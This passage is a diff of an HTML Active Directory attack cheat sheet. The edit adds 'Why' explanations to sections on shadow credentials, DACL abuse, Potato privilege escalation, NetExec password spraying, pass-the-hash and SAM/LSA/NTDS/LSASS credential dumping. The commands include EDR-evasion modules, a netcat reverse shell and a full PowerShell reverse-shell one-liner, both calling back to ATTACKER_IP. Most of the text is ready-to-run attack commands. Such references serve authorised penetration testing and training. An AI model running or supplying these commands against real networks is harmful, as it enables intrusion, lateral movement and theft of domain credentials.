+                    <p class="why"><strong>Why prefer it:</strong> non-destructive takeover — write a KeyCredential to the target, authenticate with the resulting PFX via PKINIT, and get the target's hash + TGT without ever resetting its password.</p>
+                    <div class="req"><code>GenericWrite</code>/<code>GenericAll</code> on the target + PKINIT available on a DC.</div>
+                    <pre class="cb"><span class="cm"># 1. Write KeyCredential to target</span>
 python3 pywhisker.py -d DOMAIN.LOCAL -u attacker -p &#x27;Password123&#x27; \
   --target TARGET_USER --action add --dc-ip DC_IP
 <span class="cm"># 2. Authenticate with the pfx</span>
 certipy auth -pfx TARGET_USER.pfx -dc-ip DC_IP
 <span class="cm"># → outputs NTLM hash + CCACHE</span>
-export KRB5CCNAME=TARGET_USER.ccache
+export KRB5CCNAME=TARGET_USER.ccache</pre>
 
-<span class="cm"># ── WriteDACL on target computer → grant yourself GenericAll ──────────────────</span>
-python3 dacledit.py -action write -rights FullControl \
+                    <h3>WriteDACL → grant yourself GenericAll</h3>
+                    <p class="why"><strong>Why:</strong> if you can write an object's DACL you simply grant your own account FullControl, then run any of the flows above. Turns a single WriteDACL edge into full control of the object.</p>
+                    <div class="req"><code>WriteDACL</code>/<code>WriteOwner</code> on the target.</div>
+                    <pre class="cb">python3 dacledit.py -action write -rights FullControl \
   -principal attacker -target &#x27;TARGET$&#x27; \
-  DOMAIN.LOCAL/attacker:&#x27;Password123&#x27; -dc-ip DC_IP
+  DOMAIN.LOCAL/attacker:&#x27;Password123&#x27; -dc-ip DC_IP</pre>
 
-<span class="cm"># ── Once you have a shell: check token privileges ────────────────────────────</span>
-whoami /all
+                    <h3>On the box: privileges → SYSTEM</h3>
+                    <p class="why"><strong>Why Potato works:</strong> <code>SeImpersonatePrivilege</code> (held by most service accounts) lets a process impersonate a token handed to it. The Potato tools coerce a SYSTEM service to authenticate to a local pipe, capture its token, and impersonate it — instant SYSTEM. After that, dump credentials.</p>
+                    <div class="req"><code>SeImpersonatePrivilege</code> on the host (check with <code>whoami /priv</code>).</div>
+                    <pre class="cb">whoami /all
 whoami /priv
 <span class="cm"># Look for: SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege</span>
 
-<span class="cm"># ── SeImpersonate on the box → SYSTEM via Potato ────────────────────────────</span>
-<span class="cm"># Upload GodPotato, PrintSpoofer, or SigmaPotato</span>
+<span class="cm"># SeImpersonate → SYSTEM via Potato (upload GodPotato / PrintSpoofer)</span>
 GodPotato-NET4.exe -cmd &quot;cmd /c whoami&quot;
 GodPotato-NET4.exe -cmd &quot;cmd /c net localgroup Administrators attacker /add&quot;
 PrintSpoofer.exe -c &quot;nc.exe &lt;ATTACKER_IP&gt; 4444 -e cmd&quot;
 
-<span class="cm"># ── After SYSTEM: credential dump ────────────────────────────────────────────</span>
-<span class="cm"># Dump SAM (reg save while SYSTEM/admin)</span>
+<span class="cm"># After SYSTEM: dump SAM (reg save)</span>
 reg save HKLM\SAM C:\Windows\Temp\SAM
 reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
 reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
@@ -698,11 +894,11 @@ rundll32 C:\Windows\System32\comsvcs.dll MiniDump %lsasspid% C:\Windows\Temp\lsa
                 </div>
             </details>
 
-            <!-- 10 Privileges table -->
-            <details id="s10" open>
-                <summary><span class="sum-num">10</span><span class="sum-title">AD Rights &amp; Privileges → Privesc Paths</span><span class="sum-arrow">▶</span></summary>
+            <!-- 11 Privileges table -->
+            <details id="s11" open>
+                <summary><span class="sum-num">11</span><span class="sum-title">AD Rights &amp; Privileges → Privesc Paths</span><span class="sum-arrow">▶</span></summary>
                 <div class="section-body">
-                    <p>Quick-reference for every AD right and local privilege that translates to a meaningful escalation path.</p>
+                    <p>Quick-reference for every AD right and local privilege that translates to a meaningful escalation path. The "why" is in the Abuse Path column — match the right you hold (from BloodHound or <code>whoami /priv</code>) to its attack, then jump to the relevant section above.</p>
                     <table class="priv-table">
 <thead><tr><th>Right / Group</th><th>Abuse Path</th><th>Result</th></tr></thead>
 <tbody>
@@ -737,67 +933,73 @@ rundll32 C:\Windows\System32\comsvcs.dll MiniDump %lsasspid% C:\Windows\Temp\lsa
                 </div>
             </details>
 
-            <!-- 11 nxc recon -->
-            <details id="s11">
-                <summary><span class="sum-num">11</span><span class="sum-title">nxc — Recon &amp; Enumeration</span><span class="sum-arrow">▶</span></summary>
+            <!-- 12 nxc recon -->
+            <details id="s12">
+                <summary><span class="sum-num">12</span><span class="sum-title">nxc — Recon &amp; Enumeration</span><span class="sum-arrow">▶</span></summary>
                 <div class="section-body">
-                    <p>NetExec (formerly CrackMapExec). Syntax: <code>nxc &lt;protocol&gt; &lt;target&gt; -u USER -p PASS [options]</code>. Also accepts <code>-H NTLMHASH</code> for pass-the-hash and <code>--use-kcache -k</code> for Kerberos (KRB5CCNAME must be set).</p>
-                    <pre class="cb"><span class="cm"># ── Host discovery + SMB info ────────────────────────────────────────────────</span>
-nxc smb 192.168.1.0/24                              # sweep subnet — OS, signing, hostname
-nxc smb 192.168.1.0/24 --gen-relay-list relay.txt  # hosts without signing = relay targets
+                    <p>NetExec (formerly CrackMapExec) sprays one action across many hosts/protocols. Syntax: <code>nxc &lt;protocol&gt; &lt;target&gt; -u USER -p PASS [options]</code>. Also accepts <code>-H NTLMHASH</code> for pass-the-hash and <code>--use-kcache -k</code> for Kerberos (KRB5CCNAME must be set).</p>
 
-<span class="cm"># ── Null / guest access check ────────────────────────────────────────────────</span>
-nxc smb DC_IP -u &#x27;&#x27; -p &#x27;&#x27;                           # null session
-nxc smb DC_IP -u &#x27;Guest&#x27; -p &#x27;&#x27;                      # guest session
+                    <h3>Host discovery + relay targets</h3>
+                    <p class="why"><strong>Why the relay list:</strong> hosts with SMB signing <em>not required</em> can be targeted by NTLM relay. <code>--gen-relay-list</code> pulls exactly those out of a subnet sweep so you know where a coerced authentication can be relayed.</p>
+                    <pre class="cb">nxc smb 192.168.1.0/24                              # sweep subnet — OS, signing, hostname
+nxc smb 192.168.1.0/24 --gen-relay-list relay.txt  # hosts without signing = relay targets</pre>
 
-<span class="cm"># ── Credential validation ─────────────────────────────────────────────────────</span>
-nxc smb DC_IP -u username -p &#x27;Password123&#x27;
+                    <h3>Null / guest access</h3>
+                    <p class="why"><strong>Why try it:</strong> some DCs still allow anonymous or guest binds, which can leak the user list and password policy with no credentials at all.</p>
+                    <pre class="cb">nxc smb DC_IP -u &#x27;&#x27; -p &#x27;&#x27;                           # null session
+nxc smb DC_IP -u &#x27;Guest&#x27; -p &#x27;&#x27;                      # guest session</pre>
+
+                    <h3>Credential validation</h3>
+                    <p class="why"><strong>Why first:</strong> confirm a cred works (and whether it's local or domain) before building anything on it. <code>--local-auth</code> authenticates against the host's SAM rather than the domain.</p>
+                    <pre class="cb">nxc smb DC_IP -u username -p &#x27;Password123&#x27;
 nxc smb DC_IP -u username -p &#x27;Password123&#x27; --local-auth   # local account
-nxc smb DC_IP -u username -H NTLMHASH                     # pass-the-hash
+nxc smb DC_IP -u username -H NTLMHASH                     # pass-the-hash</pre>
 
-<span class="cm"># ── User enumeration ──────────────────────────────────────────────────────────</span>
-nxc smb DC_IP -u username -p &#x27;Password123&#x27; --users
+                    <h3>User &amp; RID enumeration</h3>
+                    <p class="why"><strong>Why RID brute:</strong> even without rights to list users, you can walk the RID range over the SAMR pipe to recover every account name — often works from a null/guest session.</p>
+                    <pre class="cb">nxc smb DC_IP -u username -p &#x27;Password123&#x27; --users
 nxc smb DC_IP -u username -p &#x27;Password123&#x27; --users | grep -i &quot;badpwdcount\|admin&quot;
 
 <span class="cm"># RID brute — enumerate all accounts (works with null/guest too)</span>
 nxc smb DC_IP -u &#x27;&#x27; -p &#x27;&#x27; --rid-brute
-nxc smb DC_IP -u &#x27;Guest&#x27; -p &#x27;&#x27; --rid-brute 10000
+nxc smb DC_IP -u &#x27;Guest&#x27; -p &#x27;&#x27; --rid-brute 10000</pre>
 
-<span class="cm"># ── Group enumeration ─────────────────────────────────────────────────────────</span>
-nxc smb DC_IP -u username -p &#x27;Password123&#x27; --groups
+                    <h3>Groups &amp; shares</h3>
+                    <p class="why"><strong>Why spider shares:</strong> admins leave passwords in scripts, <code>.config</code>, and <code>unattend.xml</code> on readable shares — the spider crawls them so you can grep for creds.</p>
+                    <pre class="cb">nxc smb DC_IP -u username -p &#x27;Password123&#x27; --groups
 nxc smb DC_IP -u username -p &#x27;Password123&#x27; --groups &quot;Domain Admins&quot;
 
-<span class="cm"># ── Share enumeration ─────────────────────────────────────────────────────────</span>
 nxc smb DC_IP -u username -p &#x27;Password123&#x27; --shares
 nxc smb DC_IP -u &#x27;&#x27; -p &#x27;&#x27; --shares                        # null session shares
 
-<span class="cm"># Spider share — recursively list all files (looking for creds in configs etc.)</span>
 nxc smb DC_IP -u username -p &#x27;Password123&#x27; -M spider_plus
 nxc smb DC_IP -u username -p &#x27;Password123&#x27; -M spider_plus -o READ_ONLY=false
 
 <span class="cm"># Filter spider output for interesting extensions</span>
 cat /tmp/nxc_spider.json | python3 -c \
-  &quot;import json,sys; [print(f) for f in json.load(sys.stdin)[&#x27;DC_IP&#x27;][&#x27;shares&#x27;] if &#x27;.xml&#x27; in f or &#x27;.ini&#x27; in f or &#x27;.config&#x27; in f]&quot;
+  &quot;import json,sys; [print(f) for f in json.load(sys.stdin)[&#x27;DC_IP&#x27;][&#x27;shares&#x27;] if &#x27;.xml&#x27; in f or &#x27;.ini&#x27; in f or &#x27;.config&#x27; in f]&quot;</pre>
 
-<span class="cm"># ── Sessions / logged-on users ────────────────────────────────────────────────</span>
-nxc smb DC_IP -u username -p &#x27;Password123&#x27; --sessions
+                    <h3>Sessions &amp; password policy</h3>
+                    <p class="why"><strong>Why <code>--pass-pol</code> matters:</strong> it reveals the lockout threshold — you must know it before spraying or you'll lock accounts. <code>--loggedon-users</code> maps where privileged users are logged in (where to go hunt their tokens).</p>
+                    <pre class="cb">nxc smb DC_IP -u username -p &#x27;Password123&#x27; --sessions
 nxc smb DC_IP -u username -p &#x27;Password123&#x27; --loggedon-users
 nxc smb 192.168.1.0/24 -u username -p &#x27;Password123&#x27; --loggedon-users  # domain-wide
 
-<span class="cm"># ── Password policy ───────────────────────────────────────────────────────────</span>
 nxc smb DC_IP -u username -p &#x27;Password123&#x27; --pass-pol
 <span class="cm"># → reveals lockout threshold before spraying</span></pre>
                 </div>
             </details>
 
-            <!-- 12 nxc attacks -->
-            <details id="s12">
-                <summary><span class="sum-num">12</span><span class="sum-title">nxc — Password Spraying &amp; Attacks</span><span class="sum-arrow">▶</span></summary>
+            <!-- 13 nxc attacks -->
+            <details id="s13">
+                <summary><span class="sum-num">13</span><span class="sum-title">nxc — Password Spraying &amp; Attacks</span><span class="sum-arrow">▶</span></summary>
                 <div class="section-body">
                     <div class="tip">Always run <code>--pass-pol</code> first to check the lockout threshold before any spray.</div>
-                    <pre class="cb"><span class="cm"># ── Password spraying ────────────────────────────────────────────────────────</span>
-<span class="cm"># ALWAYS check --pass-pol first to know the lockout threshold</span>
-nxc smb DC_IP -u users.txt -p &#x27;Password123&#x27; --continue-on-success
+
+                    <h3>Password spraying</h3>
+                    <p class="why"><strong>Why spraying beats brute-force:</strong> one password against many users stays under the per-account lockout threshold. <code>--continue-on-success</code> keeps going after the first hit; <code>--no-bruteforce</code> pairs users/passwords line-by-line instead of trying every combination.</p>
+                    <div class="req">A user list and a realistic password; knowledge of the lockout policy.</div>
+                    <pre class="cb">nxc smb DC_IP -u users.txt -p &#x27;Password123&#x27; --continue-on-success
 nxc smb DC_IP -u users.txt -p &#x27;Password123&#x27; --no-bruteforce   # one attempt per user
 
 <span class="cm"># Spray across all subnet hosts (find local admin reuse)</span>
@@ -807,53 +1009,53 @@ nxc smb 192.168.1.0/24 -u username -p &#x27;Password123&#x27; --continue-on-succ
 nxc smb DC_IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
 
 <span class="cm"># LDAP spray — quieter, doesn&#x27;t touch NTLM/SMB logs on some configs</span>
-nxc ldap DC_IP -u users.txt -p &#x27;Password123&#x27; --continue-on-success
+nxc ldap DC_IP -u users.txt -p &#x27;Password123&#x27; --continue-on-success</pre>
 
-<span class="cm"># ── Pass-the-Hash ─────────────────────────────────────────────────────────────</span>
-nxc smb TARGET_IP -u Administrator -H NTLMHASH
+                    <h3>Pass-the-Hash / Pass-the-Ticket</h3>
+                    <p class="why"><strong>Why it works:</strong> NTLM accepts the hash directly, so you authenticate everywhere a reused local-admin hash is valid. Sweeping a subnet with one hash surfaces lateral-movement targets instantly. The Kerberos path reuses a cached TGT with no secret on the wire.</p>
+                    <pre class="cb">nxc smb TARGET_IP -u Administrator -H NTLMHASH
 nxc smb 192.168.1.0/24 -u Administrator -H NTLMHASH     # spray all hosts
 nxc smb TARGET_IP -u Administrator -H NTLMHASH --local-auth  # local admin
 
-<span class="cm"># ── Pass-the-Ticket (Kerberos CCACHE) ────────────────────────────────────────</span>
+<span class="cm"># Pass-the-Ticket (Kerberos CCACHE)</span>
 export KRB5CCNAME=/path/to/ticket.ccache
 nxc smb TARGET_IP -u username --use-kcache -k
-nxc smb DC_IP -u Administrator --use-kcache -k --ntds   # dump NTDS with ticket
+nxc smb DC_IP -u Administrator --use-kcache -k --ntds   # dump NTDS with ticket</pre>
 
-<span class="cm"># ── Kerberoasting ────────────────────────────────────────────────────────────</span>
-nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --kerberoasting kerberoast.txt
+                    <h3>Kerberoasting / AS-REP (see §05)</h3>
+                    <p class="why"><strong>Why here too:</strong> nxc can roast in one line while you're already enumerating over LDAP. Concept, prerequisites and full cracking reference are in §05.</p>
+                    <pre class="cb">nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --kerberoasting kerberoast.txt
 nxc ldap DC_IP -u username -H NTLMHASH --kerberoasting kerberoast.txt
+hashcat -m 13100 kerberoast.txt rockyou.txt
 
-<span class="cm"># Crack (hashcat)</span>
-hashcat -m 13100 kerberoast.txt rockyou.txt             # RC4 (etype 23)
-hashcat -m 19600 kerberoast.txt rockyou.txt             # AES128 (etype 17)
-hashcat -m 19700 kerberoast.txt rockyou.txt             # AES256 (etype 18)
-
-<span class="cm"># ── AS-REP Roasting ───────────────────────────────────────────────────────────</span>
 nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --asreproast asrep.txt
-nxc ldap DC_IP -u users.txt -p &#x27;&#x27; --asreproast asrep.txt  # no creds needed if you have userlist
+nxc ldap DC_IP -u users.txt -p &#x27;&#x27; --asreproast asrep.txt  # no creds if you have a userlist
+hashcat -m 18200 asrep.txt rockyou.txt</pre>
 
-<span class="cm"># Crack (hashcat)</span>
-hashcat -m 18200 asrep.txt rockyou.txt
-
-<span class="cm"># ── LAPS password read (AllExtendedRights on computer object) ─────────────────</span>
-nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M laps
+                    <h3>LAPS + local-admin discovery</h3>
+                    <p class="why"><strong>Why:</strong> LAPS stores each machine's randomized local-admin password in <code>ms-MCS-AdmPwd</code>; if you can read it you get that host's local admin. A plain SMB sweep flags <code>(Pwn3d!)</code> wherever your creds already have local admin.</p>
+                    <div class="req">LAPS read: <code>AllExtendedRights</code>/<code>ReadLAPSPassword</code> on the computer object.</div>
+                    <pre class="cb">nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M laps
 nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M laps -o COMPUTER=TARGET_NAME
 
-<span class="cm"># ── Find where your account has local admin ───────────────────────────────────</span>
 nxc smb 192.168.1.0/24 -u username -p &#x27;Password123&#x27;
 <span class="cm"># → Hosts showing &quot;(Pwn3d!)&quot; = local admin access confirmed</span></pre>
                 </div>
             </details>
 
-            <!-- 13 nxc dumping -->
-            <details id="s13">
-                <summary><span class="sum-num">13</span><span class="sum-title">nxc — Execution &amp; Credential Dumping</span><span class="sum-arrow">▶</span></summary>
+            <!-- 14 nxc dumping -->
+            <details id="s14">
+                <summary><span class="sum-num">14</span><span class="sum-title">nxc — Execution &amp; Credential Dumping</span><span class="sum-arrow">▶</span></summary>
                 <div class="section-body">
-                    <pre class="cb"><span class="cm"># ── Command execution ────────────────────────────────────────────────────────</span>
-nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -x &#x27;whoami /all&#x27;
+                    <p>Once a cred has local admin on a host, nxc can execute commands and pull secrets remotely over SMB.</p>
+
+                    <h3>Command execution</h3>
+                    <p class="why"><strong>Why multiple methods:</strong> each exec method uses a different mechanism (service, WMI, scheduled task, MMC) so if one is blocked/logged you switch. <code>smbexec</code> drops no binary; <code>atexec</code> uses the scheduler; pick by what the host's monitoring is likeliest to miss.</p>
+                    <div class="req">Local admin on the target.</div>
+                    <pre class="cb">nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -x &#x27;whoami /all&#x27;
 nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -X &#x27;Get-Process&#x27;            # PowerShell
 
-<span class="cm"># Execution methods (SMBexec = no dropped binary; WMIexec = WMI; MMCexec = MMC)</span>
+<span class="cm"># Execution methods (smbexec = no dropped binary; wmiexec = WMI; etc.)</span>
 nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -x &#x27;whoami&#x27; --exec-method smbexec
 nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -x &#x27;whoami&#x27; --exec-method wmiexec
 nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -x &#x27;whoami&#x27; --exec-method mmcexec
@@ -861,94 +1063,85 @@ nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -x &#x27;whoami&#x27; -
 
 <span class="cm"># Reverse shell via execution</span>
 nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; \
-  -X &#x27;$c=New-Object Net.Sockets.TCPClient(&quot;ATTACKER_IP&quot;,4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2&gt;&amp;1|Out-String);$sb2=$sb+&quot;PS &quot;+(pwd).Path+&quot;&amp;gt; &quot;;$sb3=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length)}&#x27;
+  -X &#x27;$c=New-Object Net.Sockets.TCPClient(&quot;ATTACKER_IP&quot;,4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2&gt;&amp;1|Out-String);$sb2=$sb+&quot;PS &quot;+(pwd).Path+&quot;&amp;gt; &quot;;$sb3=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length)}&#x27;</pre>
 
-<span class="cm"># ── SAM — local account hashes ───────────────────────────────────────────────</span>
-nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; --sam
+                    <h3>SAM / LSA / NTDS</h3>
+                    <p class="why"><strong>Why each:</strong> <code>--sam</code> = local account hashes (reuse); <code>--lsa</code> = LSA secrets incl. service-account plaintexts; <code>--ntds</code> = the full domain hash database via DCSync/VSS against a DC. <code>vss</code> method snapshots the volume instead of calling the replication API — stealthier.</p>
+                    <div class="req">SAM/LSA: local admin on the host. NTDS: replication rights / DA against the DC.</div>
+                    <pre class="cb">nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; --sam
 nxc smb 192.168.1.0/24 -u username -p &#x27;Password123&#x27; --sam  # sweep all hosts
 
-<span class="cm"># ── LSA secrets — service account plaintexts ──────────────────────────────────</span>
 nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; --lsa
 
-<span class="cm"># ── NTDS.dit — full domain hash dump ─────────────────────────────────────────</span>
 nxc smb DC_IP -u username -p &#x27;Password123&#x27; --ntds
 nxc smb DC_IP -u username -p &#x27;Password123&#x27; --ntds --users Administrator  # single user
-nxc smb DC_IP -u username -p &#x27;Password123&#x27; --ntds vss    # VSS method (stealthier)
+nxc smb DC_IP -u username -p &#x27;Password123&#x27; --ntds vss    # VSS method (stealthier)</pre>
 
-<span class="cm"># ── LSASS dump via modules ────────────────────────────────────────────────────</span>
-nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M lsassy       # lsassy (recommended)
-nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M nanodump      # nanodump (EDR evasion)
+                    <h3>LSASS dump modules</h3>
+                    <p class="why"><strong>Why modules differ:</strong> they trade stealth for reliability. <code>lsassy</code> reads LSASS memory remotely without writing a dump to disk; <code>nanodump</code> is tuned for EDR evasion; <code>mimikatz</code> is reliable but noisy.</p>
+                    <pre class="cb">nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M lsassy       # recommended
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M nanodump      # EDR evasion
 nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M procdump      # ProcDump upload + dump
 nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M handlekatz    # handle duplication
 nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M mimikatz      # direct mimikatz (noisy)
 
-<span class="cm"># Module options example (lsassy with method override)</span>
-nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M lsassy \
-  -o METHOD=PROCDUMP
+nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M lsassy -o METHOD=PROCDUMP</pre>
 
-<span class="cm"># ── GPP passwords — plaintext creds in SYSVOL ────────────────────────────────</span>
-nxc smb DC_IP -u username -p &#x27;Password123&#x27; -M gpp_password
+                    <h3>GPP passwords</h3>
+                    <p class="why"><strong>Why it works:</strong> old Group Policy Preferences stored a password encrypted with a key Microsoft <em>published</em>, so any domain user who can read SYSVOL can decrypt it. Still found in many environments.</p>
+                    <pre class="cb">nxc smb DC_IP -u username -p &#x27;Password123&#x27; -M gpp_password
 nxc smb DC_IP -u username -p &#x27;Password123&#x27; -M gpp_autologin</pre>
                     <div class="tip"><code>lsassy</code> is the recommended LSASS module — it avoids writing a dump file to disk by reading memory remotely via a file handle. <code>nanodump</code> is the EDR-evasion pick.</div>
                 </div>
             </details>
 
-            <!-- 14 nxc protocols/modules -->
-            <details id="s14">
-                <summary><span class="sum-num">14</span><span class="sum-title">nxc — LDAP, WinRM, MSSQL &amp; Modules</span><span class="sum-arrow">▶</span></summary>
+            <!-- 15 nxc protocols/modules -->
+            <details id="s15">
+                <summary><span class="sum-num">15</span><span class="sum-title">nxc — LDAP, WinRM, MSSQL &amp; Modules</span><span class="sum-arrow">▶</span></summary>
                 <div class="section-body">
-                    <pre class="cb"><span class="cm"># ── LDAP enumeration ─────────────────────────────────────────────────────────</span>
-nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --kdcHost DC_IP
+                    <h3>LDAP enumeration</h3>
+                    <p class="why"><strong>Why these flags:</strong> each surfaces one classic misconfig — unconstrained delegation (capture any TGT), <code>admin-count=1</code> (protected accounts), <code>PASSWD_NOTREQD</code> (blank-password logons), <code>DONT_REQ_PREAUTH</code> (AS-REP roastable), and MachineAccountQuota (can you add a machine for RBCD?). <code>get-desc-users</code> reads the description field where admins hide passwords.</p>
+                    <pre class="cb">nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --kdcHost DC_IP
 
-<span class="cm"># Unconstrained delegation (high-value pivot hosts)</span>
-nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --trusted-for-delegation
-
-<span class="cm"># AdminSDHolder-protected accounts (admin-count=1 → harder to modify ACLs)</span>
-nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --admin-count
-
-<span class="cm"># Password not required (PASSWD_NOTREQD flag)</span>
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --trusted-for-delegation   # unconstrained
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --admin-count              # protected accts
 nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --password-not-required
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --no-preauth               # AS-REP roastable
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M maq                     # machine acct quota
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M get-desc-users          # creds in descriptions
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M adcs                    # enumerate CAs/templates
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M adcs -o SERVER=CA_SERVER</pre>
 
-<span class="cm"># DONT_REQ_PREAUTH — AS-REP roastable accounts</span>
-nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --no-preauth
-
-<span class="cm"># Machine account quota (how many machine accounts a user can add — default 10)</span>
-nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M maq
-
-<span class="cm"># Descriptions with passwords (admins leave creds in AD description fields)</span>
-nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M get-desc-users
-
-<span class="cm"># ADCS — enumerate certificate authorities and templates</span>
-nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M adcs
-nxc ldap DC_IP -u username -p &#x27;Password123&#x27; -M adcs -o SERVER=CA_SERVER
-
-<span class="cm"># ── WinRM ─────────────────────────────────────────────────────────────────────</span>
-nxc winrm TARGET_IP -u username -p &#x27;Password123&#x27;
+                    <h3>WinRM</h3>
+                    <p class="why"><strong>Why:</strong> WinRM (5985/5986) gives a full remote PowerShell session. Sweeping a subnet shows where your account can get an interactive shell via evil-winrm.</p>
+                    <pre class="cb">nxc winrm TARGET_IP -u username -p &#x27;Password123&#x27;
 nxc winrm TARGET_IP -u username -H NTLMHASH                # PTH into WinRM
 nxc winrm TARGET_IP -u username -p &#x27;Password123&#x27; -x &#x27;whoami&#x27;
-nxc winrm 192.168.1.0/24 -u username -p &#x27;Password123&#x27;      # find WinRM access
+nxc winrm 192.168.1.0/24 -u username -p &#x27;Password123&#x27;      # find WinRM access</pre>
 
-<span class="cm"># ── MSSQL ─────────────────────────────────────────────────────────────────────</span>
-nxc mssql DB_IP -u sa -p &#x27;Password123&#x27;
+                    <h3>MSSQL</h3>
+                    <p class="why"><strong>Why it escalates:</strong> SQL Server runs as a service account and can run OS commands via <code>xp_cmdshell</code>. If you can enable it (sysadmin, or via <code>mssql_priv</code> privesc) you execute as that service account — often a fast path to SYSTEM.</p>
+                    <pre class="cb">nxc mssql DB_IP -u sa -p &#x27;Password123&#x27;
 nxc mssql DB_IP -u sa -p &#x27;Password123&#x27; --local-auth
 nxc mssql DB_IP -u sa -p &#x27;Password123&#x27; -q &#x27;SELECT name FROM sys.databases&#x27;
 nxc mssql DB_IP -u sa -p &#x27;Password123&#x27; -x &#x27;whoami&#x27;         # via xp_cmdshell
 nxc mssql DB_IP -u sa -p &#x27;Password123&#x27; -M mssql_priv       # check + enable xp_cmdshell
-nxc mssql DB_IP -u username -p &#x27;Password123&#x27; -M mssql_priv -o ACTION=privesc
+nxc mssql DB_IP -u username -p &#x27;Password123&#x27; -M mssql_priv -o ACTION=privesc</pre>
 
-<span class="cm"># ── SSH ────────────────────────────────────────────────────────────────────────</span>
-nxc ssh HOST_IP -u username -p &#x27;Password123&#x27;
+                    <h3>SSH</h3>
+                    <pre class="cb">nxc ssh HOST_IP -u username -p &#x27;Password123&#x27;
 nxc ssh HOST_IP -u username --key-file id_rsa
-nxc ssh 192.168.1.0/24 -u root -p &#x27;Password123&#x27;
+nxc ssh 192.168.1.0/24 -u root -p &#x27;Password123&#x27;</pre>
 
-<span class="cm"># ── Vulnerability / coercion checks ──────────────────────────────────────────</span>
-<span class="cm"># PrintNightmare — Print Spooler RCE (CVE-2021-1675 / CVE-2021-34527)</span>
+                    <h3>Vulnerability &amp; coercion checks</h3>
+                    <p class="why"><strong>Why coercion matters:</strong> PetitPotam/PrintNightmare/WebDAV can <em>force</em> a target (even a DC) to authenticate to you. That coerced auth is the trigger for NTLM relay — relay it to ADCS (ESC8, §06) or an unsigned host for machine takeover. Run ZeroLogon/EternalBlue checks in <strong>check-only</strong> mode on production.</p>
+                    <pre class="cb"><span class="cm"># PrintNightmare — Print Spooler RCE (CVE-2021-1675 / CVE-2021-34527)</span>
 nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M printnightmare
 
 <span class="cm"># ZeroLogon — safe check ONLY (never run exploit on production)</span>
 nxc smb DC_IP -u &#x27;&#x27; -p &#x27;&#x27; -M zerologon
 
-<span class="cm"># PetitPotam — NTLM coercion via MS-EFSR</span>
+<span class="cm"># PetitPotam — NTLM coercion via MS-EFSR (trigger for relay)</span>
 nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M petitpotam \
   -o LISTENER=&lt;ATTACKER_IP&gt;
 
@@ -958,18 +1151,20 @@ nxc smb TARGET_IP -u username -p &#x27;Password123&#x27; -M webdav
 <span class="cm"># EternalBlue MS17-010 (unauthenticated)</span>
 nxc smb TARGET_IP -u &#x27;&#x27; -p &#x27;&#x27; -M ms17-010
 
-<span class="cm"># ── BloodHound collection via nxc ────────────────────────────────────────────</span>
+<span class="cm"># BloodHound collection via nxc</span>
 nxc smb DC_IP -u username -p &#x27;Password123&#x27; -M bloodhound \
   -o COLLECTION_METHOD=All DOMAIN=DOMAIN.LOCAL NS=DC_IP</pre>
                 </div>
             </details>
 
-            <!-- 15 SMB -->
-            <details id="s15">
-                <summary><span class="sum-num">15</span><span class="sum-title">SMB Share Access — smbclient &amp; smbclient.py</span><span class="sum-arrow">▶</span></summary>
+            <!-- 16 SMB -->
+            <details id="s16">
+                <summary><span class="sum-num">16</span><span class="sum-title">SMB Share Access — smbclient &amp; smbclient.py</span><span class="sum-arrow">▶</span></summary>
                 <div class="section-body">
